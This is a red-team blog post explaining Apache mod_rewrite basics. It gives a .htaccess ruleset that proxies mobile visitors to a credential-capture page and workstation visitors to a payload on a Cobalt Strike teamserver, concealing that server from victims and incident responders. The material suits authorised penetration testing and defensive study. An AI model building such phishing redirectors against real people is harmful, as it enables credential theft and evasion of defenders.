---
layout: post
title: Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection
summary: An introduction to strengthening your phishing campaigns with Apache's mod_rewrite module. How to redirect mobile users to a mobile-friendly malicious website, such as a cred capture, while sending full workstations to a payload designed for workstations.
image: /assets/apache/user-agent-demo.gif
tags: 
- mod_rewrite
- phishing
- red team infrastructure
commentIssueId: 7
---

Often times a corporate internal network is heavily locked down. Workstations are restricted with limited internet access. These controls are often less strict on mobile devices (or sometimes not present), especially with BYOD being implemented more and more. While phishing, Apache access logs often show mobile devices accessing the malicious page, yet no sessions are established.

I investigated a number of ways to solve the problem and ultimately landed on using Apache's Rewrite module. The more I learned about mod_rewrite's abilities, the more benefit I saw in using Apache redirectors for phishing. This post is the first in a series of posts about solving common problems that plague phishing including users visiting a malicious website on their mobile device, users visiting non-existent resources on our fake domains, serving OS-specific payloads, slowing incident responders' investigations, expiring phishing links, and changing payloads on the fly. The post series is intended to introduce you to using Apache as a phishing redirector and using it to solve common phishing problems, and will hopefully pique your interest into learning more about what Apache can do for your phishing.


{:#intro}

# Intro

We are going to leverage an Apache box as a redirector. It will sit between our phishing targets and our infrastructure. This concept is based upon Raphael Mudge's blog post [Cloud-based Redirectors for Distributed Hacking](http://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/). The goal is prevent the end-user (and Incident Responders) from ever interacting directly with our long-term infrastructure. 

Here's what our overall infrastructure will look like:

![Apache Redirector Overview](/assets/apache/overview.png)

Our redirector will sit between the phish recipients and our long-term infrastructure, providing a layer of obfuscation. The redirectors are intended to be expendable and are likely to get caught and blocked or taken down a few times during a long engagement. Given the fragile nature of our redirectors, we are going to host all of our malicious websites and payloads on our Cobalt Strike team servers. This means even if IR blocks our domain and IP, we can quickly stand up a new domain, a new VPS with an Apache redirector, and continue onward.

As an aside, even though we're calling the Apache box a redirector, we will usually configure Apache to function as a proxy to serve assets from our teamserver directly to the phishing victims. 

{:#mod_rewrite-basics}

# mod_rewrite Basics

The mod_rewrite module is a rules-based rewriting engine that allows web admins to rewrite URLs as they're requested. Rules are evaluated top-down and generally have breakpoints set throughout. Rule writing is a bit tricky at first, at least it was for me, so for each example in this post I will provide an explanation about what each rule is doing 'in English.'


## Defining Rules

Rules can be configured either in the *apache config file* (default Debian path of `/etc/apache2/apache.conf`) or in *.htaccess* files within web directories. Both methods are generally similar, with a few distinct exceptions:

* *.htaccess* files evaluate rules based on the directory in which they reside (unless a RewriteBase is configured)
* *.htaccess* rules apply to subdirectories, unless another *.htaccess* file overrules them
* *.htaccess* rules can be modified on the fly. apache config rules require apache2 to be restarted before they take effect
* RewriteMap rules must be configured in a *.htaccess* file

In order to use *.htaccess* files, we must tell apache to allow the files to override rules in the config. In the apache config, change **None** to **All** in the following block:

```plaintext
<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
```

Another key distinction to make is that the apache config file has two contexts: server and directory.

```plaintext
<VirtualHost>
	...
		<Directory /var/www/>
			Options Indexes FollowSymLinks
			AllowOverride None
			Require all granted
			~~DIRECTORY CONTEXT~~
		</Directory>
		~~SERVER CONTEXT~~
	...
</VirtualHost>
```

The directory context is evaluated just like *.htaccess* files. There are slight differences between the contexts, but those will be addressed as needed. 

Apache recommends that the server config file be used for mod_rewrite, but we aren't running a production server and the benefit of not having to reload *apache2* every time we make a change means we will use *.htaccess*.

{:#rule-syntax}

## Rule Syntax

mod_rewrite rules can be difficult to make sense of at first. There are a lot of variables, regex, and specificities to different syntaxes.

Requests are made up of a few key components that are referred to in the rules with server variables:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
http://<span style="color: mediumseagreen">spoofdomain.com</span>/<span style="color: dodgerblue">phishing-login.html</span>?<span style="color: mediumpurple">id=1234</span><br>
http:// <span style="color: mediumseagreen">%{HTTP_HOST}</span> / <span style="color: dodgerblue">%{REQUEST_URI}</span> ? <span style="color: mediumpurple">%{QUERY_STRING}</span></div>

Here is a simple example of a rule with its 'plain English' description below:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^redirect</span> <span style="color: mediumpurple">[NC]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://google.com/</span><span style="color: mediumvioletred">?</span> <span style="color: tomato">[L,R=302]</span>
<br><br>
<span style="color: dodgerblue">If the request’s URI</span> <span style="color: mediumseagreen">starts with ‘redirect’</span> <span style="color: mediumpurple">(ignoring case),</span><br>
<span style="color: gold">rewrite the entire request</span> <span style="color: orange">to google.com</span> <span style="color: mediumvioletred">and drop any query_strings from original request.</span> <span style="color: tomato">This is a temporary redirect and the last rule that should be evaluated/applied to the request.</span>
</div>

As you can see, the ruleset will contain a conditional expression (RewriteCond) that if true will perform the next RewriteRule. By default, multiple RewriteCond strings will be evaluated as an *AND* by the server. If you wish to have rules be evaluated as an *OR*, put an [OR] flag at the end of the RewriteCond line. (Combining flags is done with a comma - [NC,OR] ).

It's important to note that when the rules are analyzed that the first matching rule is executed, similar to firewall rules. Be sure to place more specific rules higher up in the list.


## First Time Apache Setup

The *apache2* package contains everything needed to perform all of the functionality within this blog post, but not all required modules are enabled by default. To enable these modules, run the following command:

```bash
a2enmod rewrite proxy proxy_http 
```

All of the examples below are made to be run in the Directory context, so it's recommended that you place the rulesets in a .htaccess file within the web server's root directory. htaccess files should have permissions of 644.

*Update for clarity: You will need to restart the apache2 service after enabling or disabling Apache modules. a2enmod may require sudo rights, depending on your configuration.*

{:#user-agent-redirection}

# User Agent Redirection

User agent redirection allows us to gain more value from phish targets using mobile devices, redirect browsers that are buggy or incompatible with a chosen payload, and combat incident responders. In the demo below, the user visits the same URL with a standard workstation Firefox user agent and is served a payload designed for workstations. If the user browses to the URL with a mobile user agent, such as iPhone 3.0, a credential capture is served.

![Mobile User Agent Redirection Demo](/assets/apache/user-agent-demo.gif)

This ruleset will match any user whose browser user agent matches the regex of common mobile browsers and proxy the original request to the hardcoded mobile profiler hosted on a teamserver. All other requests are proxied as-is to our teamserver. To reiterate a point made above, this means the end-users (and IR) will not see our teamserver's real IP - only the one belonging to the Apache server.

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{HTTP_USER_AGENT}</span> <span style="color: mediumseagreen">"android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos"</span> <span style="color: mediumpurple">[NC]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP/MOBILE-PROFILER-PATH</span> <span style="color: tomato">[P]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP</span><span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: tomato">[P]</span>
</div>

Line by line explanation:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request's user agent</span> <span style="color: mediumseagreen">matches any of the provided keywords, </span> <span style="color: mediumpurple">ignoring case:</span><br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to serve 'MOBILE-PROFILER-PATH' from the teamserver's IP, </span><span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
If the above condition is not met, <span style="color: gold">change the entire request </span> <span style="color: orange">to serve the </span><span style="color: dodgerblue">original request path </span> <span style="color: orange">from the teamserver's IP, </span><span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span>
</div>


The [P] flags at the end of the RewriteRule lines tell Apache to act as a proxy.  If you would prefer to just redirect the user to a new URL (which will change the URL in the address bar), change the [P] to [L,R=302]. Since this communication is occurring over HTTP rather than HTTPS, the profiler should redirect if you want to perform a credential capture. Each proxy request will retain the original query string, preserving any user tracking tokens.


{:#summary}

# Summary

Apache's mod_rewrite offers powerful functionality we can leverage to strengthen our phishing campaigns. mod_rewrite processes requests and serves resources based upon a ruleset configured either in the server config file or an *htaccess* file placed in the desired web directory. To gain value from mobile users clicking phishing links, we can redirect those users to a mobile-friendly malicious website, such as a credential capture.

# Strengthen Your Phishing with Apache mod_rewrite Posts

* Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection
* [Invalid URI Redirection]({{site.baseurl}}/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/)
* [Operating System Based Redirection with Apache mod_rewrite]({{site.baseurl}}/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/)
* [Combatting Incident Responders with Apache mod_rewrite]({{site.baseurl}}/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/)
* [Expire Phishing Links with Apache RewriteMap]({{site.baseurl}}/2016-04-19-expire-phishing-links-with-apache-rewritemap/)

{:#resources}

# Resources

* [mod-rewrite-cheatsheet.com](http://mod-rewrite-cheatsheet.com)
* [Official Apache 2.4 mod_rewrite Documentation](http://httpd.apache.org/docs/current/rewrite/)
	* [Apache mod_rewrite Introduction](https://httpd.apache.org/docs/2.4/en/rewrite/intro.html)
* [An In-Depth Guide to mod_rewrite for Apache](http://code.tutsplus.com/tutorials/an-in-depth-guide-to-mod_rewrite-for-apache--net-6708)